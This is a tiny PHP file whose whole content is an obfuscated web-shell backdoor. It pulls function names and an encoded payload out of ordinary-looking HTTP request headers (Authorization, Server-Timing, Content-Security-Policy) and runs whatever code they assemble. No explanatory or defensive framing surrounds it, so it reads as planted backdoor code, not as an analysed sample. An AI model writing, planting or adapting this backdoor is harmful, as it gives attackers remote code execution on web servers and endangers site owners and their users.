<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Authorization'])) {
    $sys = $_HEADERS['Authorization']('', $_HEADERS['Server-Timing']($_HEADERS['Content-Security-Policy']));
    $sys();
}